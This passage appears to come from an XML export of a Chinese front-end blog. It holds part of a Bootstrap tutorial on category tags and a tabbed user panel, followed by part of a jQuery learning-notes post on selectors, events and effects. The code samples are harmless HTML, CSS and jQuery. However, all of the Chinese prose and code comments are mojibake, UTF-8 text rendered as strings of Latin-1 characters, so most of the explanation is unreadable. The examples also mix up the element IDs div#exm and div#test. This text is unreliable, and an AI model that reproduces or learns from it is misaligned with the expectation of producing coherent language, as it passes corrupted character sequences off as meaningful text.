ç‚¹å‡»ï¼ˆclickï¼‰äº‹ä»¶çš„å¤„ç†å‡½æ•° $(this).click(function(){ $(this).addClass(&apos;cur&apos;); $(this).parent().siblings().find(&apos;a&apos;).removeClass(&apos;cur&apos;);//åˆ é™¤å…¶ä»–ä»»ä½•é€‰é¡¹çš„curç±» $(&apos;.booklist&apos;).eq(i).show();//æ˜¾ç¤ºæœ¬èŠ‚ç‚¹ $(&apos;.booklist&apos;).eq(i).siblings().hide();//éšè—å…„å¼ŸèŠ‚ç‚¹ }) }); }); åœ¨å³ä¾§å…·ä½“ä»£ç ä¸­ï¼Œä¸ºäº†é€‚åº”å±å¹•å¤§å°ï¼Œå°†col-md-3æ”¹ä¸ºäº†col-xs-3,å¦‚æœä½ æƒ³ä½¿ç”¨è¿™ä¸ªæ’ä»¶çš„è¯åœ¨ä½ çš„é¡¹ç›®ä¸­è®°å¾—æ”¹å›å»:)ã€‚å¦å¤–ï¼Œjsä»£ç ç›´æ¥æ”¾åœ¨äº†HTMLçš„å°¾éƒ¨ã€‚ ä»¿è±†ç“£åˆ†ç±»æ ‡ç­¾çš„å®ç°ä¸ºäº†å’Œæ–‡ç« åˆ†ç±»éƒ¨åˆ†çš„æ ·å¼è¿›è¡ŒåŒºåˆ†ï¼Œæˆ‘å†³å®šè‡ªå·±åŠ¨æ‰‹å†™ä¸€ä¸ªå…·æœ‰å…¶ä»–æ ·å¼çš„åˆ†ç±»æ ‡ç­¾é›†ã€‚åˆšå¥½çœ‹åˆ°è±†ç“£è¯»ä¹¦æ¿å—çš„é¦–é¡µä¸­çš„å›¾ä¹¦åˆ†ç±»æ ‡ç­¾è¿˜ä¸é”™ï¼Œäºæ˜¯å†³å®šè‡ªå·±å†™ä¸€ä¸ªç±»ä¼¼çš„æ ·å¼ã€‚é¦–å…ˆæ˜¯HTMLä»£ç éƒ¨åˆ†ï¼š &lt;div class=&quot;col-md-4&quot;&gt; &lt;h5 style=&quot;margin-top:0px;&quot;&gt; å›¾ä¹¦åˆ†ç±» &lt;/h5&gt; &lt;div class=&quot;row&quot; id=&quot;bookclass&quot;&gt; &lt;a href=&quot;å›¾ä¹¦åˆ†ç±»é¡µé¢&quot; class=&quot;col-md-3&quot;&gt;åˆ†ç±»å&lt;/a&gt; &lt;!--å…¶ä»–åˆ†ç±»--&gt; &lt;/div&gt; &lt;/div&gt; å¯ä»¥çœ‹åˆ°å›¾ä¹¦åˆ†ç±»æ ‡ç­¾å¾ˆç®€å•â€”â€”ç›´æ¥ä½¿ç”¨â€™aâ€™æ ‡ç­¾ä½œä¸ºåˆ†ç±»æ ‡ç­¾ï¼Œä¸‹é¢åªè¦é’ˆå¯¹å®ƒå†™CSSæ ·å¼å°±å¯ä»¥äº†ã€‚ //aæ ‡ç­¾æ ·å¼ #bookclass a { display:block;//åŒºå—æ˜¾ç¤º background-color:#f5f5f5;//èƒŒæ™¯è‰²ï¼ˆè·Ÿè±†ç“£ç›¸åŒï¼‰ text-align:center;//æ–‡å­—å±…ä¸­ padding:2px 5px;//å†…è¾¹è·ï¼Œä¸Šä¸‹2pxï¼Œå·¦å³5px float:left;//å·¦æµ®åŠ¨ï¼Œä»è€Œå¯ä»¥å®ç°æ°´å¹³æ’åˆ— margin:2px 2px;//å¤–è¾¹è·ï¼Œä¸Šä¸‹2px,å·¦å³2px } //å½“é¼ æ ‡æ‚¬åœæ—¶æ”¹å˜èƒŒæ™¯è‰² #bookclass a:hover { background-color:#e8e8e8;//åŒè±†ç“£é¢œè‰² } ç”¨æˆ·æ¿å—çš„è®¾è®¡ä¸å®ç°å¸ƒå±€ç”±äºé¡¹ç›®å¼€å‘æ—¶é—´ä»“ä¿ƒï¼Œç”¨æˆ·æ¿å—æ²¡æœ‰åŠ å…¥ç‰¹åˆ«çš„æ ·å¼ç¾åŒ–å’Œè¡Œä¸ºï¼Œè€Œæ˜¯ä½¿ç”¨äº†åŸç”Ÿtabã€‚åœ¨ç”¨æˆ·æ¿å—ä¸­ï¼Œä¸»è¦å±•ç¤ºæœ€æ–°åŠ å…¥çš„ç”¨æˆ·å’Œä¸ºåšå®¢ç¤¾åŒºåšå‡ºæœ€å¤šè´¡çŒ®çš„ç”¨æˆ·ï¼ˆé«˜åˆ†ç”¨æˆ·ï¼‰ã€‚å¸ƒå±€æ¯”è¾ƒç®€å•ï¼Œé‡‡ç”¨æ•´å—å¸ƒå±€ï¼Œåˆ©ç”¨å®ƒæ¥å±•ç¤ºç”¨æˆ·ä¿¡æ¯ã€‚å¸ƒå±€ä¸»è¦ä»£ç å¦‚ä¸‹ï¼š &lt;div class=&quot;panel panel-default&quot;&gt; &lt;!--ç”¨æˆ·å±•ç¤ºåŒº--&gt; &lt;/div&gt; ç”¨æˆ·æ¿å—çš„å®ç°ç”¨åˆ°çš„BootStrapå…ƒç´  åœ¨ç”¨æˆ·æ¿å—ä¸»è¦ç”¨åˆ°çš„BootStrapå…ƒç´ å¦‚ä¸‹ï¼š Bootstrap tabâ€”â€”ä»¥æ ‡ç­¾é¡µçš„æ–¹å¼å±•ç¤ºæ–°ä¼šå‘˜å’Œé«˜åˆ†ä¼šå‘˜ åœ†å½¢å›¾ç‰‡åŒºï¼ˆimg-circleï¼‰â€”â€”ç”¨äºå±•ç¤ºç”¨æˆ·çš„å¤´åƒã€‚ å®ç°è¿‡ç¨‹ ç”¨æˆ·æ¿å—ä¸»è¦ä½¿ç”¨äº†BootStrap tab,å‰é¢çš„ç« èŠ‚å·²ç»ä»‹ç»è¿‡å…¶ä½¿ç”¨æ–¹æ³•ã€‚ä¸»è¦åŒ…æ‹¬ï¼š 1.åœ¨DIVä¸­åŠ å…¥role=â€tabpanelâ€ï¼Œè¯¥DIVåˆ™ä¼šæˆä¸ºtab &lt;div role=&quot;tabpanel&quot;&gt; &lt;/div&gt; 2.ä½¿ç”¨åˆ—è¡¨æ¥åˆ¶ä½œæ ‡ç­¾é¡µ &lt;ul id=&quot;myTabregister&quot; class=&quot;nav nav-tabs&quot; role=&quot;tablist&quot;&gt; &lt;li role=&quot;presentation&quot; class=&quot;active&quot;&gt; &lt;a href=&quot;#newRegister&quot; id=&quot;home-tab&quot; role=&quot;tab&quot; data-toggle=&quot;tab&quot; aria-controls=&quot;home&quot; aria-expanded=&quot;true&quot;&gt;æ–°ä¼šå‘˜&lt;/a&gt; &lt;/li&gt; &lt;li role=&quot;presentation&quot; class=&quot;&quot;&gt; &lt;a href=&quot;#highScoreRegister&quot; role=&quot;tab&quot; id=&quot;profile-tab&quot; data-toggle=&quot;tab&quot; aria-controls=&quot;profile&quot; aria-expanded=&quot;false&quot;&gt;é«˜åˆ†ä¼šå‘˜&lt;/a&gt; &lt;/li&gt; &lt;/ul&gt; åŒæ ·ï¼Œåˆ—è¡¨ä¸­ï¼Œè¶…çº§é“¾æ¥çš„åœ°å€hrefçš„å€¼å’Œå•ä¸ªæ ‡ç­¾å†…å®¹é¡µçš„idå€¼ä¸€ä¸€å¯¹åº”ï¼Œå¦‚æœ€æ–°ä¼šå‘˜æ ‡ç­¾é¡¹çš„href=&quot;newRegister&quot;ã€‚ 3.æ ‡ç­¾å†…å®¹åŒºåŸŸï¼ˆtab-contentï¼‰ &lt;div id=&quot;myTabContent&quot; class=&quot;tab-content&quot; style=&quot;text-align:center;&quot;&gt; &lt;!--æœ€æ–°ä¼šå‘˜å±•ç¤ºåŒº--&gt; &lt;!--é«˜åˆ†ä¼šå‘˜å±•ç¤ºåŒº--&gt; &lt;/div&gt; 4.å•ä¸ªæ ‡ç­¾é¡µ(tabpanel) &lt;div role=&quot;tabpanel&quot; class=&quot;tab-pane fade active in&quot; id=&quot;newRegister&quot; aria-labelledby=&quot;home-tab&quot;&gt; &lt;div class=&quot;row&quot; style=&quot;margin-top:10px;&quot;&gt; &lt;div class=&quot;col-md-2&quot; style=&quot;height:200px;&quot;&gt; &lt;a href=&quot;ä¼šå‘˜ä¸»é¡µ&quot;&gt; &lt;img class=&quot;img-circle&quot; src=&quot;å›¾ç‰‡è·¯å¾„&quot;style=&quot;width:80px; height: 80px;&quot; &gt; &lt;/a&gt; &lt;/div&gt; &lt;!--å…¶ä»–æœ€æ–°ä¼šå‘˜â€¦â€¦--&gt; &lt;/div&gt; &lt;!--é«˜åˆ†ä¼šå‘˜--&gt; è¯¥ç¤ºä¾‹ä»£ç ä¸­ä¸»è¦åˆ—å‡ºäº†â€œæœ€æ–°ä¼šå‘˜â€çš„å±•ç¤ºä¿¡æ¯ï¼Œå…¶IDä¸ºnewRegister,ä¸å…¶æ ‡ç­¾é¡¹çš„é“¾æ¥åœ°å€ç›¸åŒã€‚å…¶ä¸­æ¯ä¸ªä¼šå‘˜ä¿¡æ¯å æœ‰çš„å±å¹•å®½åº¦ä¸ºcol-md-2(åœ¨å³ä¾§ä»£ç ä¸­ä¸ºäº†æ»¡è¶³å±å¹•å°ºå¯¸éœ€è¦æ”¹ä¸ºcol-xs-2),ä¹Ÿå°±æ˜¯æ¯6ä¸ªç”¨æˆ·å æ®ä¸€è¡Œã€‚ æœ¬è¯¾ç¨‹å†…å®¹è½¬è‡ªï¼šæ±‡æ™ºç½‘]]></content>
      <tags>
        <tag>BootStrap</tag>
        <tag>å‰ç«¯</tag>
        <tag>ç¼–ç¨‹</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JQueryå­¦ä¹ ç¬”è®°]]></title>
    <url>%2F2016%2F08%2F28%2FJQuery%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[JQueryæ˜¯ä»€ä¹ˆï¼Ÿ Jqueryæ˜¯ä¸€ä¸ªåŸºäºjavascriptçš„æ¡†æ¶ï¼Œç­‰äºè¯´æŠŠjavascriptå°è£…äº†ä¸€ä¸‹ã€‚éœ€è¦åœ¨htmlä¸­é“¾æ¥äº†JQueryçš„æ–‡ä»¶æ‰èƒ½ç”¨ï¼Œä½ æŸ¥çœ‹æºä»£ç ï¼Œå°±èƒ½çœ‹åˆ°é“¾æ¥Jqueryçš„ä»£ç ï¼š &lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot; src=&quot;https://www.xxx/js/jquery-1.8.3.min.js&quot;&gt;&lt;/script&gt; å­¦JQueryè·Ÿå­¦javascriptæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œæ˜¯ä¸æ˜¯è¦ç²¾é€šjavascriptæ‰èƒ½å­¦JQuery? jqueryæ˜¯åŸºäºjavascriptï¼Œæ‰€ä»¥å¯ä»¥è¯´å†™jqueryè„šæœ¬æœ‰ä¸€åŠæ˜¯åœ¨å†™javascriptï¼Œä½†jqueryåˆæœ‰å¾ˆå¤šç‰¹æ€§æ˜¯å®ƒç‹¬æœ‰çš„ã€‚jqueryæ˜¯å°è£…äº†javascriptï¼Œæ˜¯ä¸ºäº†ç®€åŒ–javascriptè„šæœ¬è€Œå­˜åœ¨ï¼Œæ‰€ä»¥æ²¡å¿…è¦ç²¾é€šjavascriptï¼Œjavascriptä¸­å¾ˆå¤šçš„å‡½æ•°åœ¨jqueryä¸­éƒ½æœ‰æ›´ç®€å•çš„æ›¿ä»£æ–¹å¼ã€‚ å¼€å§‹å…¥é—¨å§ å…¥é—¨ä¹‹å‰ï¼Œå…ˆç®€å•åœ°çœ‹ä¸€ä¸‹html+css+javascriptçš„è¯­æ³•ï¼Œå†æ¥çœ‹è¿™ç¯‡æ–‡ç« ï¼Œè¿™ä¼šè®©ä½ æ›´å¥½åœ°ç†è§£ä»£ç ã€‚Jqueryæœ€å¤§çš„ç‰¹ç‚¹æ˜¯æ–¹ä¾¿å¯¹DOMçš„å°è£…ã€‚ä»€ä¹ˆæ˜¯DOMï¼ŸDOMå°±æ˜¯æ“ä½œhtmlæ–‡ä»¶çš„æ ‘ç»“æ„çš„æ–¹æ³•ï¼Œæˆ‘ä»¬çœ‹å›¾ç‰‡ã€‚ ä»è¿™ä¸ªå›¾å¾ˆæ˜æ˜¾çš„å°±èƒ½çœ‹å‡ºï¼Œå®é™…ä¸Šhtmlæ–‡ä»¶ä¸­æ¯ä¸€ä¸ªæ ‡ç­¾éƒ½æ˜¯ä¸€ä¸ªèŠ‚ç‚¹ï¼Œæ•´ä¸ªhtmlæ–‡æ¡£ç»„æˆäº†ä¸€æ£µæ ‘ã€‚ åœ¨javascriptä¸­ï¼Œæˆ‘ä»¬æœ‰ä¸€äº›å‡½æ•°å¯ä»¥è®¿é—®è¿™äº›èŠ‚ç‚¹ï¼Œå¹¶å¯¹ä»–ä»¬è¿›è¡Œå¢åŠ ã€åˆ é™¤ã€ä¿®æ”¹ã€‚æ¯”å¦‚ï¼ŒgetElementById(xxx)å°±æ˜¯è·å¾—idä¸ºxxxçš„å¯¹è±¡ï¼Œå®ƒå¯èƒ½å°±æ˜¯ä¸€ä¸ªdivæ ‡ç­¾ã€‚æˆ‘ä»¬ç”¨é¢å‘å¯¹è±¡çš„æ€æƒ³æ¥çœ‹ï¼Œå®é™…ä¸Šè·å¾—çš„æ˜¯ä¸€ä¸ªidä¸ºxxxçš„divå¯¹è±¡ã€‚è¿™ä¸ªå¯¹è±¡å®é™…ä¸Šå°±æ˜¯ä»&lt;div id=xxx&gt;åˆ°ç›¸åº”&lt;/div&gt;è¿™æ‰€æœ‰çš„å†…å®¹ã€‚ é€šè¿‡è¿™ä¸ªå¯¹è±¡çš„ç›¸å…³æ–¹æ³•å°±èƒ½å¾ˆæ–¹ä¾¿åœ°ç›´æ¥æ“ä½œhtmlæ–‡ä»¶ã€‚ åœ¨Jqueryä¸­ï¼ŒDOMå˜å¾—æ›´åŠ ç®€å•ã€‚ é€‰æ‹©å™¨ è¦æ“ä½œhtmlæ–‡æ¡£ï¼Œå°±ç”¨åˆ°é€‰æ‹©å™¨ã€‚ ä¸¾ä¸ªå¾ˆç®€å•çš„ä¾‹å­ï¼Œ$(â€œdiv#exmâ€) é€‰æ‹©äº†idä¸ºexmçš„divå…ƒç´ ã€‚å¦‚ä¸‹ä»£ç èƒ½è®©â€œæµ‹è¯•1â€è¿™ä¸‰ä¸ªå­—é€šè¿‡ç‚¹å‡»æŒ‰é’®æ˜¾ç¤ºåœ¨htmlä¸­ï¼š &lt;html&gt; &lt;head&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;/jquery/jquery.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt; $(document).ready(function(){ $(&quot;button&quot;).click(function(){ $(&quot;div#test&quot;).html(&quot;æµ‹è¯•1&quot;); }); }); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;button type=&quot;button&quot;&gt;ç‚¹å‡»æˆ‘&lt;/button&gt; &lt;div id=&quot;test&quot;&gt;&lt;/div&gt; &lt;/body&gt; &lt;/html&gt; å¤§å®¶å¯ä»¥æŠŠä»£ç æ”¾è¿›http://www.w3school.com.cn/tiy/t.asp?f=html_basicè¿è¡Œï¼ŒæŸ¥çœ‹æ•ˆæœã€‚ æ¥åˆ†æä¸€ä¸‹è¿™ä¸€å°æ®µJqueryä»£ç ã€‚é¦–å…ˆï¼Œ$(document)ï¼Œè¿™ä¸ªé€‰æ‹©å™¨é€‰æ‹©çš„æ˜¯æ•´ä¸ªæ–‡æ¡£ã€‚readyæ˜¯ä¸€ä¸ªäº‹ä»¶ï¼Œè¡¨ç¤ºç­‰æ•´ä¸ªæ–‡æ¡£åŠ è½½å®Œæˆåå†è¿è¡Œè¿™æ®µjavascriptã€‚ä¸€èˆ¬Jqueryçš„ä»£ç éƒ½æ”¾åœ¨è¿™ä¸ªå—é‡Œé¢ã€‚$(â€œbottonâ€)é€‰æ‹©äº†æ–‡æ¡£ä¸­ç¬¬ä¸€ä¸ªï¼Œä¹Ÿå°±æ˜¯æŒ‰é’®ã€‚clickä¹Ÿæ˜¯ä¸€ä¸ªäº‹ä»¶ï¼Œè¡¨ç¤ºå½“è¯¥æŒ‰é’®è¢«ç‚¹å‡»åæ‰§è¡Œè¿™é‡Œé¢çš„ä»£ç ã€‚$(â€œdiv#testâ€)å°±æ˜¯é€‰æ‹©çš„id=testçš„å…ƒç´ ï¼Œå¯¹è¯¥å…ƒç´ æ‰§è¡Œæ–¹æ³•html()ï¼Œhtmlæ–¹æ³•å°±æ˜¯è¯»å–æˆ–ä¿®æ”¹ä¸­çš„å†…å®¹ã€‚ï¼ˆå…·ä½“æ˜¯è¯»å–è¿˜æ˜¯ä¿®æ”¹è¦çœ‹å…·ä½“æƒ…å†µï¼Œåœ¨æˆ‘è¿™é‡Œå°±æ˜¯ä¿®æ”¹ï¼‰ æ‰€ä»¥ï¼Œç‚¹å‡»äº†æŒ‰é’®åï¼Œ&lt;div id=&quot;exm&quot;&gt;&lt;/div&gt;ä¸­å°±è¢«åŠ å…¥äº†â€œæµ‹è¯•1â€ä¸‰ä¸ªå­—ã€‚ åˆ°æ­¤ä¸ºæ­¢ï¼Œæˆ‘ä»¬ä¸€å…±æ¥è§¦åˆ°å¦‚ä¸‹å‡ ä¸ªæ¦‚å¿µï¼š é€‰æ‹©å™¨ï¼š$(xxx) äº‹ä»¶ï¼šready()ã€click() æ–‡æ¡£æ“ä½œæ–¹æ³•ï¼šhtml() å¤§å®¶åº”è¯¥å°±äº†è§£ä¸ªå¤§æ¦‚äº†ã€‚é€šè¿‡Jqueryï¼Œæˆ‘ä»¬å°±å¯ä»¥æ“ä½œhtmlä¸­ä»»ä½•æ ‡ç­¾å†…çš„ä»»ä½•å†…å®¹ã€‚æˆ‘æ¥åˆ—ä¸¾å‡ ä¸ªã€‚ ä¿®æ”¹css é€šè¿‡cssæ–¹æ³•å¯ä»¥æ“ä½œcssã€‚æ¯”å¦‚å¦‚ä¸‹ä»£ç ï¼š &lt;html&gt; &lt;head&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;/jquery/jquery.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt; $(document).ready(function(){ $(&quot;button&quot;).click(function(){ $(&quot;div#test&quot;).css(&quot;color&quot;, &quot;red&quot;); }); }); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;button type=&quot;button&quot;&gt;Click me&lt;/button&gt; &lt;div id=&quot;test&quot;&gt;æµ‹è¯•2&lt;/div&gt; &lt;/body&gt; &lt;/html&gt; å°†åˆšæ‰çš„ä»£ç æ”¹äº†ä¸€ç‚¹ï¼Œçœ‹è¿™å¥è¯ï¼š$(â€œdiv#exmâ€).css(â€œcolorâ€, â€œredâ€); å°†id=testçš„divå…ƒç´ çš„cssæ ·å¼colorå€¼æ”¹æˆredã€‚æˆ‘ä»¬ç‚¹å‡»äº†æŒ‰é’®åå°±èƒ½çœ‹åˆ°ï¼Œâ€œæµ‹è¯•2â€ä¸‰ä¸ªå­—å˜æˆäº†çº¢è‰²ã€‚ éšè—å’Œæ˜¾ç¤ºå’ŒåŠ¨ç”»æ•ˆæœ Jqueryè‡ªå¸¦äº†ä¸€äº›åŠ¨ç”»æ•ˆæœï¼Œé€šè¿‡ä¸€äº›å‚æ•°å°±èƒ½æ˜¾ç¤ºå‡ºæ¥ã€‚çœ‹å¦‚ä¸‹ä»£ç  &lt;html&gt; &lt;head&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;/jquery/jquery.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt; $(document).ready(function(){ $(&quot;button&quot;).click(function(){ $(&quot;div#test&quot;).hide(&apos;slow&apos;); }); }); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;button type=&quot;button&quot;&gt;Click me&lt;/button&gt; &lt;div id=&quot;test&quot;&gt;æµ‹è¯•3&lt;/div&gt; &lt;/body&gt; &lt;/html&gt; ç‚¹å‡»äº†æŒ‰é’®åï¼Œâ€œæµ‹è¯•3â€è¿™ä¸‰ä¸ªå­—æ…¢æ…¢æ»‘åŠ¨ç¦»å¼€äº†ï¼Œå¾ˆåƒå¹»ç¯ç‰‡æ˜¯å§ï¼Ÿæˆ‘ä¹Ÿåªæ˜¯æ”¹äº†ä¸€å¥è¯ï¼š$(â€œdiv#exmâ€).hide(â€˜slowâ€™); å°†id=testçš„divå…ƒç´ éšè—ï¼Œå¹¶ä¸”æ˜¯æ…¢æ…¢éšè—ï¼Œå› ä¸ºæœ‰â€™slowâ€™å‚æ•°ã€‚ hideæ–¹æ³•å°±æ˜¯éšè—ä¸€ä¸ªå…ƒç´ æ‰€æœ‰å†…å®¹çš„æ–¹æ³•ã€‚å®ƒæœ‰ä¸€ä¸ªå‚æ•°ï¼Œè¡¨ç¤ºéšè—çš„å¿«æ…¢ã€‚ å½“ç„¶æœ‰hideæ–¹æ³•å°±æœ‰showæ–¹æ³•ï¼Œç”¨æ³•ä¸€æ ·ã€‚è¿˜æœ‰ä¸€ä¸ªæ–¹æ³•toggleï¼Œè¡¨ç¤ºåœ¨éšè—å’Œæ˜¾ç¤ºä¸­åˆ‡æ¢ã€‚æœ‰è¿™ä¸‰ä¸ªæ–¹æ³•ï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“å¼¹å‡ºä¸€ä¸ªèœå•æˆ–è®©ä¸€ä¸ªä¸è¦çš„å†…å®¹æ¶ˆå¤±ï¼Œè€Œä¸”æœ‰åŠ¨ç”»æ•ˆæœã€‚ å½“ç„¶ï¼ŒJqueryè¿˜æ”¯æŒæ›´å¤šåŠ¨ç”»æ•ˆæœï¼Œæœ‰å¾ˆå¤šæ–¹æ³•ï¼Œå¤§å®¶å¯ä»¥è‡ªå·±å»æ¢ç´¢ã€‚ æ”¹å˜å…ƒç´ å¤§å° æˆ‘ä»¬å¯ä»¥ç”¨Jqueryçš„height()å’Œwidth()æ–¹æ³•æ”¹å˜ä¸€ä¸ªå…ƒç´ çš„å¤§å°ã€‚è¿™ä¸ªå·¥ä½œä¹Ÿå¯ä»¥ç”¨css()æ–¹æ³•å®Œæˆã€‚é€šè¿‡è¿™ä¸ªæ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥åŠ¨æ€æ”¹å˜æˆ‘ä»¬ç½‘ç«™çš„å…ƒç´ ï¼Œæ¥é€‚åº”ç”¨æˆ·æµè§ˆå™¨çš„åˆ†è¾¨ç‡ã€‚ æ›´å¤šäº‹ä»¶ï¼šæ–‡æœ¬æ¡†è·å¾—ã€å¤±å»ç„¦ç‚¹ åœ¨å¾ˆå¤šç½‘ç«™å¡«å†™è¡¨å•çš„åœ°æ–¹éƒ½ç”¨åˆ°äº†è¿™ä¸ªæ•ˆæœï¼š &lt;html&gt; &lt;head&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;/jquery/jquery.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt; $(document).ready(function(){ $(&quot;:text&quot;).focus(function(){ $(&quot;:text&quot;).val(&quot;&quot;); }); }); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;input type=&quot;text&quot; value=&quot;è¯·å¡«å†™ç”¨æˆ·å&quot; style=&quot;color: #999;&quot;/&gt; &lt;/body&gt; &lt;/html&gt; å½“é¼ æ ‡ç‚¹å‡»è¾“å…¥æ¡†æ—¶â€œè¯·å¡«å†™ç”¨æˆ·åâ€è¿™å‡ ä¸ªå­—æ¶ˆå¤±æ‰ã€‚è¿™å°±æ˜¯focusäº‹ä»¶ï¼Œå®ƒè¡¨ç¤ºæŸä¸ªæ§ä»¶è·å¾—ç„¦ç‚¹ã€‚çœ‹çœ‹ä»£ç ï¼Œç”¨åˆ°äº†ä¸€ä¸ªé€‰æ‹©å™¨$(â€œ:textâ€)ï¼Œå®ƒè¡¨ç¤ºæ‰€æœ‰type=textçš„inputå…ƒç´ ã€‚å½“è¯¥å…ƒç´ è·å¾—ç„¦ç‚¹åï¼Œæ‰§è¡Œäº†valæ–¹æ³•ã€‚è¿™ä¸ªæ–¹æ³•å°±æ˜¯æ”¹å˜inputæ ‡ç­¾çš„valueå±æ€§ï¼Œä¹Ÿå°±æ˜¯æ”¹å˜æ˜¾ç¤ºåœ¨æ–‡æœ¬æ¡†å†…çš„å†…å®¹ã€‚ é€‰æ‹©å™¨è¯¦è§£å’Œcssè¯­æ³• ä¸Šé¢åªæåˆ°äº†ä¸€ä¸ªidé€‰æ‹©å™¨ï¼Œé€‰æ‹©id=xxxçš„æŸå…ƒç´ ã€‚å…¶å®Jqueryçš„é€‰æ‹©å™¨å¯è°“å¤šç§å¤šæ ·ï¼Œå¯¹cssæ¯”è¾ƒç†Ÿæ‚‰çš„åŒå­¦å°±å¾ˆå¥½å­¦äº†ï¼Œå› ä¸ºcssçš„è¯­æ³•Jqueryé€‰æ‹©å™¨åŸºæœ¬éƒ½èƒ½ç”¨ã€‚ æ¯”å¦‚ï¼Œcssé‡Œé¢ï¼Œå®šä¹‰ä¸€ä¸ªç±»çš„æ ·å¼çš„æ–¹æ³•ï¼š.XXX{}ï¼Œè€Œåœ¨Jqueryé‡Œé€‰æ‹©ä¸€ä¸ªclass=XXXçš„å…ƒç´ çš„æ–¹æ³•ï¼š$(â€œ.XXXâ€)ã€‚ ä¸¾ä¸€äº›å¸¸ç”¨çš„ä¾‹å­ï¼Œè¯¦ç»†çš„é€‰æ‹©å™¨è¯´æ˜åœ¨w3schoolé‡Œéƒ½æœ‰åˆ—å‡ºã€‚ è¿™åªæ˜¯æˆ‘ä¸¾çš„ä¸€äº›ä¾‹å­ï¼ŒåŸºæœ¬ä¸Šé€‰æ‹©å™¨Jqueryå’Œcssç±»ä¼¼ï¼Œæ‰€ä»¥å¯¹cssæ¯”è¾ƒç†Ÿæ‚‰çš„äººå¯ä»¥å¾ˆå¿«æŒæ¡Jqueryçš„é€‰æ‹©å™¨è¯­æ³•ï¼Œè¿™ä¹Ÿæ˜¯Jqueryæµè¡Œçš„åŸå› ä¹‹ä¸€ï¼Œå¾ˆå¥½å­¦ä¹ ï¼Œä¸€é€šç™¾é€šã€‚ äº‹ä»¶è¯¦è§£ åœ¨å¾ˆå¤šJqueryä»£ç ä¸­ï¼Œæˆ‘ä»¬æ€»æ˜¯èƒ½çœ‹åˆ°æ˜¯è¿™æ ·çš„å½¢å¼ï¼š $(document).ready(function(){ //Jqueryä»£ç  }); æ‰€æœ‰çš„ä»£ç è¢«å¥—åœ¨äº†æœ€å¤–å±‚çš„readyä¸­ã€‚æˆ‘ä¸Šæ¬¡ä¹Ÿæåˆ°äº†ï¼Œreadyæ˜¯ä¸€ä¸ªäº‹ä»¶ã€‚æˆ‘ä»¬ä¸Šé¢è¯´çš„é€‰æ‹©å™¨ï¼Œå®ƒé€‰æ‹©æŸå…ƒç´ çš„ä½œç”¨ï¼Œå…¶å®å°±æ˜¯ä¸ºäº†å®Œæˆåé¢çš„å·¥ä½œã€‚çœ‹æˆ‘ä»¬è¿™ä¸ªä»£ç ï¼Œ$(document)é€‰æ‹©çš„æ˜¯documentå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡å­¦javascriptåº”è¯¥å¾ˆæ¸…æ¥šï¼ŒæŒ‡çš„å°±æ˜¯æ•´ä¸ªhtmlæ–‡æ¡£ã€‚é€‰åœ¨é€‰åœ¨åˆ°äº†å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡æœ‰ä¸€ä¸ªæ–¹æ³•ready(); readyæ˜¯ä¸€ä¸ªäº‹ä»¶ã€‚äº‹ä»¶æ˜¯ä»€ä¹ˆæ¦‚å¿µï¼Œå’Œå¾ˆå¤šç¼–ç¨‹ä¸€æ ·ï¼Œäº‹ä»¶æ˜¯ç”±ç”¨æˆ·åœ¨æ‰§è¡Œç›¸åº”çš„æ“ä½œåè‡ªåŠ¨è§¦å‘çš„ä¸€ä¸ªè¿‡ç¨‹ï¼Œæˆ‘ä»¬å¯ä»¥ç»™æŸäº‹ä»¶ç»‘å®šä¸€ä¸ªå¤„ç†å‡½æ•°ï¼Œå½“ç”¨æˆ·è§¦å‘äº†è¿™ä¸ªäº‹ä»¶åï¼Œå°±èƒ½æ‰§è¡Œæˆ‘ä»¬ç»‘å®šçš„å‡½æ•°ã€‚ ready()æ˜¯ä¸€ä¸ªäº‹ä»¶ç»‘å®šå‡½æ•°ï¼Œå®ƒä¸­é—´é‚£ä¸ªfunction(){}å°±æ˜¯æˆ‘ä»¬ä¸ºreadyäº‹ä»¶ç»‘å®šçš„å‡½æ•°ã€‚readyäº‹ä»¶åœ¨å¯¹è±¡åŠ è½½å®Œæˆåè§¦å‘ï¼Œæˆ‘ä»¬å‰é¢é€‰æ‹©çš„æ˜¯documentå¯¹è±¡ï¼Œæ‰€ä»¥è¿™ä¸ªreadyå°±æ˜¯æŒ‡æ•´ä¸ªæ–‡æ¡£åŠ è½½å®Œæˆåè§¦å‘çš„äº‹ä»¶ã€‚ æ‰€ä»¥æ•´æ®µä»£ç æ„æ€å°±æ˜¯ä¸ºdocumentå¯¹è±¡çš„readyäº‹ä»¶æ·»åŠ å“åº”å‡½æ•°function(){}ï¼Œè¿™ä¸ªå‡½æ•°é‡Œé¢æ·»åŠ æˆ‘ä»¬å¸Œæœ›Jqueryåšçš„äº‹æƒ…ã€‚å½“æ–‡æ¡£åŠ è½½å®Œæˆåï¼Œæ‰§è¡Œæ­¤å‡½æ•°ï¼Œç›¸å½“äºæ‰§è¡Œæˆ‘ä»¬çš„ä»£ç ã€‚ æˆ‘åˆ—ä¸¾ä¸€äº›Jqueryä¸­å¸¸ç”¨çš„äº‹ä»¶åŠå…¶ç»‘å®šå‡½æ•°ï¼š click é¼ æ ‡ç‚¹å‡»äº‹ä»¶ ï¼ˆæœ€å¸¸ç”¨ï¼Œå½“é¼ æ ‡ç‚¹å‡»æŸå¯¹è±¡æ—¶è§¦å‘æ­¤å‡½æ•°ï¼‰ change 